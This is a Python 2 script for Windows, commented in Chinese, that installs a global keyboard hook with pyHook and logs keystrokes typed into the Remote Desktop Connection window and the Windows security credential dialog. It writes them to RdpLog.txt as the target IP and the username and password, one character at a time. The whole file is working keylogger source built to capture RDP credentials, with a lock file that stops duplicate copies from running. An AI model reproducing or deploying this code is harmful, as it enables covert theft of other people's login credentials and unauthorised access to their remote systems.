# -*- coding: utf-8 -*-
#Test On Win7
import pythoncom,sys
import pyHook
import winerror, pywintypes, win32file


StringRdpIP = unicode('遠端桌面連線','utf-8')
StringRdpUser_Password = unicode('Windows 安全性','utf-8') 
Lockfp = None #LogFile Handle
LogFilefp = None #LogFIle Handle

class LockError(StandardError):
  pass

class WriteLockedFile(object):

	def __init__(self, path):
		try:
			self._handle = win32file.CreateFile(
				path,
				win32file.GENERIC_WRITE,
				0,
				None,
				win32file.OPEN_ALWAYS,
				win32file.FILE_ATTRIBUTE_NORMAL,
				None)
		except pywintypes.error, e:
			if e[0] == winerror.ERROR_SHARING_VIOLATION:
				raise LockError(e[2])
			raise

	def close(self):
		self._handle.close()

	def write(self, str):
		win32file.WriteFile(self._handle, str)



def CheckExitProcess():
	global Lockfp
	try:
		Lockfp = WriteLockedFile('LockFile.rdp')
		return False
	except:
		return True#存在 不執行

#---------------------------------------------#


def onMouseEvent(event):
	# 監聽滑鼠事件
	print "MessageName:", event.MessageName
	print "Message:", event.Message
	print "Time:", event.Time
	print "Window:", event.Window
	print "WindowName:", event.WindowName
	print "Position:", event.Position
	print "Wheel:", event.Wheel
	print "Injected:", event.Injected
	print "---"

	# 返回 True 以便將事件傳給其它處理程序
	# 注意，這兒如果返回 False ，則滑鼠事件將被全部攔截
	# 也就是說你的滑鼠看起來會僵在那兒，完全失去回應了
	return True

def onKeyboardEvent(event):
	global LogFilefp
	# 監聽鍵盤事件
	#print "MessageName:", event.MessageName
	#print "Message:", event.Message
	#print "Time:", event.Time
	#print "Window:", event.Window
	#print "WindowName:", event.WindowName
	
	#最難搞的地方在這，中文判斷
	#StringRdpIP = unicode('遠端桌面連線','utf-8')
	#StringRdpUser_Password = unicode('Windows 安全性','utf-8') 
	try:
		StringWindowsName = unicode(event.WindowName,'big5')
	except:
		StringWindowsName = ''

	#print 'StringWindowsName:%d' % (len(StringWindowsName))
	#print 'StringRdpUser_Password:%d' % (len(StringRdpUser_Password))

	#print repr(StringWindowsName)
	#print repr(StringRdpUser_Password)

	if StringWindowsName == StringRdpIP:
		buf = 'IP:%s' % chr(event.Ascii)
		LogFilefp.write(buf + '\n')
		LogFilefp.flush()

		#print "IP:", chr(event.Ascii)

	if StringWindowsName == StringRdpUser_Password:
		buf = 'User&Pass:%s' % chr(event.Ascii)
		LogFilefp.write(buf + '\n')
		LogFilefp.flush()

		#print "User&Pass:", chr(event.Ascii)
		
	# 同滑鼠事件監聽函數的返回值
	return True

def main():
	
	# 建立一個「Message Hook」管理物件
	hm = pyHook.HookManager()

	# 監聽所有鍵盤事件
	hm.KeyDown = onKeyboardEvent
	# 設置鍵盤「Message Hook」
	hm.HookKeyboard()

	# 監聽所有滑鼠事件
	#hm.MouseAll = onMouseEvent
	# 設置滑鼠「Message Hook」
	#hm.HookMouse()

	# 進入循環，如不手動關閉，程序將一直處於監聽狀態
	pythoncom.PumpMessages()

if __name__ == "__main__":
	#檢查是否重複開啟
	
	if CheckExitProcess():
		print 'Exit'
		sys.exit(0)

	#建立Log檔案
	LogFilefp = open("RdpLog.txt","w")
	
	main()
	
